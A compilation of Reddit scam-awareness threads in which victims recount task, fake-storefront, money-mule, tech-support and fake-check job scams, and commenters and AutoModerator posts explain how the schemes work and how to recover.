- Not that I‚Äôm aware of‚Ä¶ he used to leave weird scribbled ones as well written on random bits of paper, but he graduated to this official sounding letter.  I was actually mildly impressed by it because up until then I was convinced it was a homeless person doing it (also because a lot of stuff he ships to my house is random camping gear).
- He‚Äôs a frail older guy, so I‚Äôm not super concerned.  I do already have the things you mentioned as well as door/window alarms
- I didn't want to screw them, but also needed my items for my business.

It did freak me out until I figured it out and contacted fedex.  My husband and I are not the type to spend that type of money on a watch.  I was worried someone watching my house or trying to involve me in a scam.
- 1 more day till i can start buying parts and im praying to god this doesn't happen, ive saved for months for this (¬£700 is my full budget) and if they fail to deliver an item or even worse send a broken one id cry, i am currently unemployed again so it would take me literally about a year to save up money to buy a replacement part.
- That would fall under the "obvious misdelivery" clause, I'd say. They ordered one and got two? Any reasonable person would conclude that somebody made a mistake.
- They wouldn't go after you for the cost of these items. It's not cost effective. I wouldn't stress about it.
- Or one that‚Äôs very conscious of compliance. If the call is being recorded and they know that, then the manager cannot just have a casual conversation with you, they practically have to have a lawyer speak to you, and then only reading from pre-written and cleared statements.
- I guess but it's certainly not a shady bank, it's a Fortune 50 company that we have all heard of.
- What a creep.  I'm not sure how I'd react.  Ignore? Or put up my own sign trying to counteract?
- That is a crazy note! I think they attempted to make it sound as official as possible, but very much over did it. They tried way too hard to make up reasons why you shouldn't touch the packages, even though they're sent to your address.
- If they lose the package or send you a broken part, you should be able to get your money refunded, or best yet they might replace it.  Good luck with your first build!!
- Thats the part so many people don't get. They think getting something in the mail is a free ticket to keep it no matter what. If you order something and they mistakenly send the wrong thing you have to return it (at their expense) if requested.
- Or train their managers better.
- Perhaps ‚Äúshady bank‚Äù is just being repetitive. :/
- Pray tell, what Fortune 50 bank has such shady practices. 

-

Really, you don‚Äôt need to. They hire from the same pool of people and enact the same practices.
- Thank you, im just stessing over alot of stuff atm unfortunately so the tiny bit of anxiety i have about this is getting worse
- No, that doesn‚Äôt really help when you‚Äôre dealing with banking regulators and massive liability. See, if an employee is recorded explaining a policy incorrectly to one customer, it might provide cause for litigation by thousands of customers over an inconsistent policy, and as soon as you say you‚Äôre recording they assume you‚Äôre litigious.
- Redundant, yes.
- ü§∑üèª I'm not about to proactively doxx myself, and it's a short enough list to narrow down if you actually cared. I worked doing compliance investigations and reporting for them for almost ten years after I got off the phones and their  standards for that are some of the highest in the country. I don't think you know what shady means.
- Breathe.... it's an exciting time!

Title: Thought it was legit turned out to be scam
Body: So, I got this message, earn 40rs for every whatsapp channel. Initially the person shared a whatsapp channel link to follow. I followed, shared the screenshot. Then I was asked to contact someone on telegram, share the details like name & upi id to receive the amount. I did and got 200INR.

Then I got added to the group. I earned 1400 easily. Later they told you have to deposit money to receive commission & bonus, I did. they told to trade for ETC currency but mistakenly I did for ETH currency. they had to stop the whole process.

Initially I deposited 7010, entire transaction got corrupted. And for this mistake and to return the money they asked for 34960. This is where my mind stopped working & like a lunatic I paid them 34960. and they confirmed we will get our money back. Then they told this was part of the repairing the damages done. 34960  was the first part, 108000 was second amount which I had to pay to receive the whole amount. My mind stopped working again & I sent them this money. 

So, I paid total 7010 + 34960 + 108000 = 149970.

For refund, they shared some steps.

Do TEST transaction of 2000, after FIRST transaction of 2000, apply for 130000.

This is where I got confused. Actually, TEST & FIRST transaction were 2 different transactions of 2000 each, then 3rd transaction of 130000 & 4rth with remaining amount. I was supposed to get 226480.

I thought TEST & FIRST were same. I requested 2000, it was success. Then 130000. 130000 immediately threw error and entire amount got locked. Now they asked me to transfer 224480 additional amount to unfreeze the account. Since, I saw the screenshot of people getting their money, I thought of paying this.

I paid and tried requesting whole amount (as they told in the chat). Now here comes the SCAM. Due to one mistake my profile points reduced to a level where I cannot withdraw the money. No one told this rule. When I tried transaction, it failed. And I turned cold.

Some guy from helpline told this is rule they follow. Now, my own 374450 were at stake. I have to increase 20 points to withdraw everything. 1 point costs 19900, so 20 points costs 398000.

Anyways, I lost all 374450 lakhs.

- I am sorry you lost money. It's a hard way to learn a lesson.

But you have not yet learned the full lesson: it was a scam from the start. And it's a common scam, reported here multiple times every day.  Please read on.

You know now that it's a scam, but you dont yet grasp the depth of the scam. You need to understand the total scam, so you don't get scammed again.

**It was a scam from the beginning. There was never any job.** 

Everything was fake. The tasks you did were fake, to make you think you were doing something of value. **You didn't make any mistakes, they told you that to keep your money.**

You never made any money. You gave money to scammers. **The screens they showed you with money earned were made up. It was all lies.** You gave them money, and they gave you back a little bit to make you think that they would actually pay you. But the whole thing was set up from the beginning to take your money.
 
Everyone gets scammed, there's no shame in that. **But you need to learn more, to see red flags before someone else scams you.** They will try, but you can scam-proof yourself.

Browse or search through r/scams, you will see that many people fall for job scams and lose money. Sometimes they lose all their savings, have their bank accoint closed for fraud.
- *Now here comes the SCAM.*

No, it was a scam from the beginning. There was nothing legitimate at any point.
- WhatsApp + Telegram =  Guaranteed Scam
- The convoluted ‚Äúmistakes‚Äù that required you to pay to repair were all part of the scam‚Äîthis is a typical script they were following to extract more money from you. The posting of screenshots and being in a chat group with lots of other ‚Äúinvestors‚Äù are all part of the scam as well (all the accounts in there except yours are run by the scammer).

You‚Äôll now be receiving DMs from !recovery scammers claiming they can get your money back for an upfront fee. They cannot and they too are looking to scam you. You pay the fee and they take off with your money‚Äîthe scam is as simple as that. There is no one that can get your money back; it‚Äôs lost.
- Hi /u/Wide-Spray-2186, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- No one is giving away money to randos on the Internet.

Make a post-it note that says that.  Put it on your monitor.  Make it your phone‚Äôs background screen.  Say it when you say your prayers at night.

Hope for easy money is the hook scammers use to make you do stupid things later.

The scam will involve how you get the money.  You‚Äôll need to pay a small fee, then they take the fee and never give you the money.  Or they‚Äôll pay you too much and ask you to send some of it back, which because of how banks transfer money and handle fraud will mean that when the money they sent is clawed back, the money you sent them will not be. Or they‚Äôll give it to you in crypto trading account that you‚Äôll put more into‚Ä¶ Or any one of a number of money transfer schemes.
- Imagine a homeless guy comes up to you on the street and tells you to solve a riddle for 3000$. You wouldn't even give him as much as a minute of your time.

This is exactly the same.
- You're going to find that the internet is full to bursting with "philanthropists" who reach out to random people to give them money. They are all scammers. As was mentioned, this will be the !advancefee scam akin to ye olde "You won the Publisher's Clearinghouse lottery!" scam
- Lies, nothing but lies. He is not a philanthropist, he will ask you to pay him something to get the money. So you give him some of your money, and then he disappears. Random people don't give you money, on or off the internet.

This is a very old scam, it's been around for a long time, way before internet or email or computers. Probably existed in ancient Greece 2500 years ago: I will give you a free goat. All you have to do is give me 20 drachmas for transportation and taxes.

And people have been falling victim to this forever, which is why con artists keep trying it.

You never get the prize, the free goat, the free money.

Title: I think I fell for this online scam through a ‚Äútoo good to be true‚Äù sale ad on insta
Body: I saw this instagram AD showing a ‚Äútoo good to be true‚Äù sale for youngLA products. If you don‚Äôt know, those products are usually expensive, ranging from 40-100 USD on average, but this ad showed products being on sale for under 10 USD! But my dumbass didn‚Äôt think about the fact that this MIGHT be a scam and went to their website. The website looked exactly like the official youngLA website except the search bar shows ‚Äúoutfitgleam.com‚Äù and not ‚ÄúyoungLA.com‚Äù. Unfortunately, I didn‚Äôt notice the fishy website name and went ahead and bought a couple of stuff. Right when I bought it, is when I realized ‚Äúdang‚Ä¶ this is kinda suspicious‚Äù. I immediately searched through the internet if ‚Äúoutfitgleam.com‚Äù is a safe website. I saw some companies saying it‚Äôs potentially a fraud website so I‚Äôm pretty sure I just dropped some money, my shipping and billing address and my card information to this weird website. It also didn‚Äôt give me an option to cancel the order. Fortunately I didn‚Äôt spend a whole lot. It was worth just an above average lunch. And I also deactivated my card immediately in case my card information is used against me. But will I need to be concerned about the information I put in? Also after the order, they sent a confirmation email with the order number and what not and when I looked at their email address, it had an ‚Äú@gshbj.com‚Äù which is super fishy itself. Is that a scam email? From any of this information I gave out, what are my biggest concerns?

- Just avoid anything advertised on social media, since 99.99% of it, other than an ad from a large, well-established company, is a scam. But also note that many scammers create company names and logos that mimic the big boys, that pretend to be a sale division of a larger company, and so it would even be best to avoid the established company ads. It really is nothing but a cesspool of corruption.
- !whois gshbj.com
- !whois outfitgleam.com
- !whois outfitgleam.com

You‚Äôll need to immediately cancel whatever card you used with your financial institution and request a new one.
- Cancel your card asap
- Don‚Äôt click on ANY ads on IG, Facebook, WhatsApp, or TikTok.


These platforms literally allow advertisers outside of the U.S. advertise scams targeted at U.S. audiences. See all those fake Mr. Beast ads on YouTube? They don‚Äôt care.

Social media ads in general should be ignored.
- It may well just be a company selling cheap Chinese knockoffs, but you can‚Äôt tell these days who are ripoff merchants, and who are scammers.

Best to ignore all ads on social media - the majority of them are scams.
- I just had the same kind of ad in insta but for another brand: Passenger. I thought it was too good to be true and checked the site before completing my purchase. I didn't do it thanks to your comment! Thank you. Here's the name of the fraud site: retroavant ,They also used  ‚Äú@gshbj.com‚Äù
- I literally just fell for this same shit. I paid $78 for like 24 items. I wear YoungLA a lot and sometimes they have good deals. Outfitgleam is a Chinese company and a scale. I‚Äôm so fucking pissed. Chase can‚Äôt do anything for me either.
- Yea I fell exactly for those scammers that mimic the large companies. They mimicked it well and I didn‚Äôt notice until a little late, but i took some necessary actions and should be fine for now

- I thought it would turn out like this. Are there major concerns of my shipping and billing address information being given there?
- Your address is public. Its just the credit card that's an issue, which you already cancelled.
- Yes I immediately deactivated the card, and then called my institution. The transaction didn‚Äôt actually go through fortunately so if it does go through I believe I will need to take action

Title: Got Scammed and now my PayPal account's on negative balance.
Body: this is my fault for trusting someone so easily.

So i saw this request on an art commission discord server saying that his client uses PayPal but he doesn't, so he is looking for someone who can receive the money then transfer to his bank account. take note that to be able to send a request on that server, you need to have a verified buyer badge and to have you need to do verification tests with the server mods which is very strict.

Fast forward so his "client" was able to send money to my e-wallet and then i successfully transferred it to his bank account. Then next day, the "client" issued a refund, now that I'm on 0.00 balance because i already transferred it, I'm now on negative balance (-$256). I tried asking the client and then his messages started from being calm and then straight up being violent. This happened again he got another "client" and then did the same thing. That client also sent the same tone of messages, and that makes me think that the "clients" are actually his accomplice.

i feel so stupid i thought i was helping someone and learned the lesson of not trusting anyone with money the hard way.

I'm still trying to resolve this but I do not know how.

be careful out there! double triple check!

- Never act as a bank for anyone, *especially* a stranger on the Internet you've never met.
- It's a scam, you were used as a money mule to transfer funds from a stolen account to a different account owned by the scammer. Your money is unfortunately gone.
- What type of art commission Discord server would allow a request to launder money through PayPal? The whole server is likely a scam if they allow that instead of art commissions.
- I am sorry you lost money, its a hard way to learn a lesson.

Being online these days is an obstacle course. There are so many scammers, and they pop up on all sites: shopping sites, selling sites (buyers scam you, sellers scam you), dating sites, job search sites. 

Are you selling your artwork? If so, are you familiar with the !artist scam, where a fake client commissions art from you, but they actually just want to steal your money? 

You need to educate yourself, to become more scam-proof. Read through this sub. There are many sad stories here on r/scams of people who have lost money to scams that begin with meeting someone online.
- Never help strangers transfer money. If they don't want to ask their friends or family for help they are up to no good.
- Why would they need a stranger on the internet to do this instead of a friend, partner, parent, sibling, etc? Regardless, don‚Äôt believe any who says they can get your money back. !recovery
- I'm sure this is embarrassing, but could you clarify a couple questions your post brought to mind?

1. Did you ask or wonder why the "client" didn't just open a Paypal account?

2. Did I read correctly that you fell for this scam twice? Can you explain how they convinced you it wouldn't happen again?

Thanks for you time, sorry this happened to you
- Why are you acting as a bank for strangers or anyone at that? What was in it for you ?
- When it comes to money the only people you can really trust is your family and that‚Äôs only if you have a good relationship with them
- FFS people. How do you fall for this??? The client and the artist are the same guy.  How much were you transferring that you ended up on a negative $256? I wouldn't even pass that money through someone I trust in real life.

Report it to paypal and let it be a lesson that if someone is ever asking you to do something outside of the "normal" way, it is a scam.
- It amazes me that people still fall for such basic scams.
- What‚Äôs the discord server?
- This wasn‚Äôt a one time thing? Please immediately end any communications with these guys. File a dispute and wait for PayPal, also that art website might be a compromised one.
- i do not actually have any money on the wallet. when the client sent the money my account is on 0.00 because i already transferred everything to my other wallets in case that this is going to be a scam. my problem now is paypal is forcing me to pay the negative balance that the "clients" refunded.

yeaa this is so unfortunate and I do not know if I will just pay it up or wait for paypal to resolve it or maybe lock my wallet
- Just report it to PayPal and hope for the best.
- thank you for this
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Artist or NFT scam.

This is a variant of the advance fee scam. The scammer will often use a stolen social media account to increase their credibility. A scammer will contact an artist, and ask to purchase one of their works of art (paintings, digital media or photos), and they will offer a generous sum of money. It can take three forms: a fake payment email (in which you're instructed to pay some fee to receive the money), a fake check (in which you're asked to forward some money elsewhere), or a fake NFT minting scam.

In this latest variant, the scammer suggests to buy the art piece in NFT form. The victim is instructed to mint the NFT in a fake minting website, which charges money for the fuel (as any NFT minting service does). The difference is, the scammers control this fake website and run away with your money. After you mint the NFT, the scammer disappears without paying for the piece.

This is a scam where a scammer impersonates a client. For the scam where a scammer impersonates an artist, call the automoderator trigger (muse).

- Hi /u/IHaveBoxerDogs, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- 1. the client told me that his account is new and the money will be put on hold if they make transactions and i experienced that but i just patiently waited it out that's why i kind of know how annoying it is to make transactions on paypal especially for new users. im gonna admit i overlooked this detail when talking to that person and was blinded by the thought of just helping some artist in need. (it's my first time encountering this kind of scam as an artist so i really did feel dumb and stupid after and i was also desperate in earning some as the person stated to me that I will get the share of 10% of his transactions.)

2. no i didnt fell for it twice, after the first "client" refunded, the scammer used my account again to receive money through personal/ family and then refunded it. the only negative balance reflected from my wallet is from the first transaction as i was able to transfer the money from that but not on the second.
- Brownie points or to ‚Äòfeel good‚Äô I guess
- The Wyvern Nest | Art & Commissions
- That's exactly what happened. He was laundering money through your paypal accounts, and paypal is now out the money. They will seek to recover it from you.
- paypal won‚Äôt resolve anything, that money is gone. and i don‚Äôt know, but i imagine they have some sort of requirement for zeroing out a negative balance
- I wouldn't recommend waiting for PayPal, the two resolutions they are likely to go for are sending you to collections which will ruin your credit, or suing you depending on the balance.

Neither is fun.
- So in your mind, you were aware it could have been a scam but went ahead anyway. Hard lesson to learn, best bet is to just pay it and forget it otherwise you‚Äôll just annoy yourself thinking about it.
- Why would you not pay it ? You are responsible for your account.
- It's the !muse scam 

PayPal will send you to collections if you don't pay what you owe them.
- There is nothing for PayPal to resolve. 

As far as PayPal is concerned, these are two separate transactions. The transaction in which you sent the money out was verified by you, and you intended to send the money. As such, it‚Äôs not going to be reversed.
- I would really like to know Ops mindset.
- yeaaa, i think i'll just pay it up
- Greedy mindset.
- Hi /u/jol72, AutoModerator has been summoned to explain the Muse scam.

The muse scam is a variant of the [fake check scam](https://consumer.ftc.gov/articles/how-spot-avoid-report-fake-check-scams) in which the scammer will contact the victim over social media and claim to want to use their image for an art project. The scammer will often use a stolen social media account to increase their credibility. They will offer a generous sum of money and offer to pay via check, and the victim is instructed to send money to the scammer for ‚Äúmaterials‚Äù via an irreversible method. The victim is under the illusion that the funds cleared when the bank makes the money available thanks to current regulations. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months.

If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. You can summon the fake check automoderator explanation using the trigger fakecheck. Thanks to redditor aNeatHat for this script.

This is a scam where a scammer impersonates an artist. For the scam where a scammer targets artists, call the automoderator trigger (artist)

- OP didn't mention the part where they would have been allowed to keep some money as a cut for making the transfer. 

Once again it's greed for for risk gamble, and OP lost.
- Sadly, your best option.


This was a scam from end to end, and you were the target.


Never trust strangers, especially on the internet, and most especially with money.
- This.  There is always a worm at the end of the line.

Title: Sister-in-law called ‚ÄúMicrosoft‚Äù after seeing an error and got her to log into her bank account
Body: Hey all, my sister in law got scammed. Less than an hour ago, she got an error on her screen after mistyping a websites name saying something along the lines of ‚ÄúYour ip address has been compromised please contact Microsoft support. Do not attempt to close the error.‚Äù It is obviously a mistake and a scam but she didn‚Äôt know any better. 

She said they got her to log into her bank account and check if there was any fraudulent activity but didn‚Äôt do anything else. 

I told her she should immediately go to her bank and get all new credit/debit cards, change her password, set up 2FA and anything else the bank recommends to lock down her account.

I asked her if there was any chance they could have saw her social security or anything else other than the bank account and she said no. What are other precautions she should be taking?

Any help is greatly appreciated!

- Assume that any browser-stored passwords or any password manager that was already logged into were breached. Change the most sensitive passwords such as banks first.
- If she downloaded AnyDesk, or TeamViewer, or UltraViewer - RMMs like that can generally be easily located and removed.

If she downloaded 'ScreenConnect' - it is difficult to locate and neutralize.

Often victims aren't sure what they downloaded.  Add to that the reality that once given AnyDesk or TeamViewer type access fraudsters will nowadays often also sneakily download ScreenConnect.  So you may remove AnyDesk or TeamViewer - but you have not fully remediated the problem.
- She probably used remote desktop on her computer which the scammers took advantage of, so make sure to remove the Remote Desktop software (the scammers direct victims on how to install it, so just find the program she installed).

In times past, they would do things like set a password on the system‚Äôs password database and then the computer can‚Äôt boot without this password, but Windows 10 took that away. With Remote Desktop they could theoretically download and install software on her computer, you can look in the program list to see anything new that should be deleted, or just reset the whole computer, basically the ‚Äùnuke it from orbit, only way to be sure‚Äù option.
- She needs to change her password immediately *on a different device*, and then go to the bank, tell them what happened, and see what they advise. It‚Äôs best to assume the entire account is compromised. 

This is a very old scam, so the bank should be able to help lock that account down, but the password change needs to happen immediately.
- If there's a chance the scammers saw her account info or had access to her online profile, the bank should immediately lock down that log-in profile, get her set up with new accounts and cards, and get a new online profile set up. She should be able to call the bank from her phone to have them disable the profile, but she should also check to make sure her personal info like phone numbers or address hasn't been changed. She doesn't want to get a new card only to have it mailed to the scammer.
- If she just called them, but did not enable them to connect to her computer, there is not much they could have gotten.  Just browsing to their page is not going to enable them to get any data from her computer.
- Out of curiosity, why do people often advise "go to the bank".   I don't get it.  I work in banking and all day long people come in to report fraud.  We always tell them to call the number on the back of their card to report it and that's all that we can do for them.  There are often times that they want to use our desk phone and have us dial the number for them and hand them the headset.  
Why don't people just have the common sense to call the customer service number instead of trekking to a bank where we are all severely understaffed and then we have impatient people waiting in the lobby for something they could have done from their couch.  Can anyone explain?
- Gotcha, just told her to change all her passwords starting with banks/mortgage/amazon/paypal type ones first. Thanks!
- Agreed, just assume everything is compromised and react accordingly.
- And if they downloaded ANYTHING, they should use a different device to change their passwords.¬†

And don‚Äôt forget to change the password on your email, as that can be used to reset passwords on many sites.
- Does this require getting a professional IT person to run a search tool or a purge or something?
- The "on a different device" bit is important; have to assume her computer is compromised until PROVEN otherwise
- To me, It reads as though she did give them access.
- I know how to do it if the Windows computer is in front of me.

But it's not, so there's only Google or ChatGPT or something.
- The story didn't say anything about downloading any remote access software.

Title: Wondering if anyone has heard of this company before as I‚Äôm worried that this could be a WFH scam
Body: So here‚Äôs some content!

The other day I received a message to my current number from a unknown number/ Company saying that they loved my resume and they saw it on indeed (exact text in last photo posted) and I was actually ecstatic about it as the other day I was actually looking for remote jobs because unfortunately my health conditions make me working on site colored impossible for me right now. So me and the Human Resources manager that messaged me started ‚Äúchatting‚Äù and decided to conduct a briefing/interview with me to see if I was a good fit for the job. The number that messaged me was also from a IOS device not to mention so at first I assumed they would do a FaceTime like interview or at least a phone call to get all of this together but no‚Ä¶ it was just purely text the whole way through which I obviously found odd. Afterwards I was basically ‚Äúhired on the spot‚Äù which again. Odd. But I had a friend egging me on trying to keep me optimistic about it as finding online work for me has been hard so they were actually quite excited for me‚Ä¶ other than that information we kept chatting after I was ‚Äúhired‚Äù and they discussed many things such as the pay being weekly plus certain benefits would be offered the usual and then another red flag hit they discussed me receiving a check in the mail to buy office supplies for a home office‚Ä¶ and they were very straight up about their employees needing to have a checking account with a ‚Äúvalid bank‚Äù? And to me it just felt like they were aiming at a check bounce scam because Ive delt with something like it before but never from a job that had my name and my number personally. Though once again optimism. 

I continued answering to see where it would go and they directed me to a website to fill out my information for the job (basically sent me to a job application forum on there? I thought I had the job already awh) the website just looked sketchy to me especially when I looked at the team‚Äôs photos I was just a little off put by the blandest oddly edited website. Like for a company that claims big bucks it was just horridly done to me for some reason maybe I‚Äôm just too skeptical but I‚Äôll stop on the context for now 

here‚Äôs the photos and thank you in advance for any help or clarity you can give me from this, and if you‚Äôve delt with (said company name) before let me know your experience 



TLDR: a company messaged me about a WFH job I already counted about 9 major red flags in this situation yet my friend is a bit optimistic about it for me, wondering if it‚Äôs actually a scam and I got my hopes up or if it‚Äôs something I should actually go for 

FYI: if it is a scam please having some actual WFH suggestions would be amazing with your advice thank you in advance!!!

- They'll send a !fakecheck

No one's getting that pay for data entry.

!job
- WFH data entry position? Sorry, but most WFH job offers are scams, and these in particular, and all those where the scammers contact you and "love your CV", are scams.
- They want to know your bank so they can send you a fake check from a different bank (so it takes longer to bounce)
- Red Flags 

1. Quoted you a salary , then gave you an hourly pay.

2. Hired you for a data entry job based on your DESIGN PORTFOLIO? 

3. Offered you 4 methods of payment then claim you HAVE to have a checking account to get paid. 

As others have stated , it will definitely be a fake check scam . There ARE WFH jobs out there but not at those pay rates. More like $16-20 an hr. Started one yesterday for GE appliances. Look on [ratracerebellion.com](http://ratracerebellion.com) for some legit leads for WFH jobs.
- As others have mentioned, it‚Äôs unfortunately a scam. In addition to everything else that is questionable, doing¬†a reverse image search of ‚ÄúAshley Jones‚Äù bland photo will show you it‚Äôs a stock photo.

Sorry OP, I hope you find a good job in the near future ü§ûüèª
- While there are still WFH jobs out there, they have decreased precipitously since the pandemic ended. Most of the remote jobs that are still hiring require very select skills and many years of experience. Finding a remote entry level job is like finding a two-headed unicorn. The vast, *vast* majority of entry level WFH jobs that are advertised are scams. If you're looking for a remote job, you will literally have to wade through a thousand scam jobs before finding that one diamond in the rough. It would be far safer to just look for an in-person job in your area.

Also beware of direct sales hellholes such as those you might find in r/devilcorp. These companies are actually continually looking for employees - because the work is so shitty that most people give up within months. If someone seems cagey about what they do, and won't say exactly who they are, and mention commission-based salary (usually only *after* an interview), then you might want to run far away.
- Unlimited vacation and attractive pension scheme. Those are nice perks. 



The hourly pay doesn't even match the annual pay.
- If you got a job you never applied for, it's probably a scam.

Where is this company based?  Do they have an actual office address and phone number where they can be reached?

Are they registered in the state where they claim to exist?

Since they are realtors, they are required to be licensed, call up that state's realtor board and find out.
- They also...wanted you to start on a Saturday?  And if it's WfH, why is it also Hybrid and 2 days remote?  Where's the office you need to go to for the other 3 days?
- $29 starting salary for "daily tasks", flexible hours (as long as you're logged in by 9am), and why do they need the name of your bank? Also, the the HR Director's name sounds very generic and not legitimate at all. This isn't a real job offer. It's leading up to a !fakecheck scam.
- The scams always, always spend way too much time talking about how they will pay you. Real jobs and recruiters don't give a shit about that because it's such an assumed part that no one stresses about
- Not sure if it came up for you, but I don't see a linked in page for them at all yet they found you on linked in? I definitely agree with others stating that this is a fake check scam. I also worked in data entry for 7 years and that's a waaaay high pay rate for data entry.
- Odd that they would mention how salary is ‚Äúpaid out‚Äù. As well as the use of that awkward weird term.

I couldn‚Äôt read the text at the bottom of that image because of Reddit‚Äôs formatting in the iPhone app.
- Scam. They will be sending you a fake check.
- Most definitely a scam, there's no company that will hire a 100% remote data entry role reporting to HR for $37/hour.
- Work from home jobs exist, but they are usually more for skilled positions such as IT.  And they often don't pay great unless you have a special skill or a lot of experience (and often both).

Nobody is paying an insane rate to let you enter data at home. And no legitimate company has you buy your own equipment that is all provided to you.
- Ask for their address of business and they‚Äôll shut up quick.
- This is a scam. They probably are doing the timeshare scam where they have you call timeshare owners and tell them someone wants to buy their timeshare. That isn't or never has been a thing but scammers insist it is.
- They quite literally in one of your messages said the word task. It‚Äôs probably a task scam.
- I hope you didn't fill out their phone application. That could lead to identify theft.
- Well for a start the two ladies they reckon are in their "Executive Leadership team" are just models bought from the usual stock photo sites.
- >FYI: if it is a scam please having some actual WFH suggestions would be amazing with your advice thank you in advance!!!

99+% of WFH is a scam anymore.
- Hi /u/Ok-Lingonberry-8261, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Hi /u/Ok-Lingonberry-8261, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- But this data entry person is supposed to take their brand to the next level, sooo.... plus unlimited vacation days sounds pretty good.
- They love her "design portfolio" and it's relevance to the...data entry job?  Mmk
- And the hourly rate they offered you does NOT equate to the salary they offered.  Salary was offered at $78,960, which divided by 2080 hours (52 weeks x 40 hrs per week) would be $37/hr, not $29/hr.  This whole thing is clearly a scam.

- Hi /u/Motor-Donkey6837, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- I even looked for them on Indeed and I didn‚Äôt find them there either so I think it‚Äôs definitely non existent at this point honestly
- Says it's only remote 2 days a week...but she has no idea what office she would be supposedly reporting to for the other 3?  And they don't bother to mention?
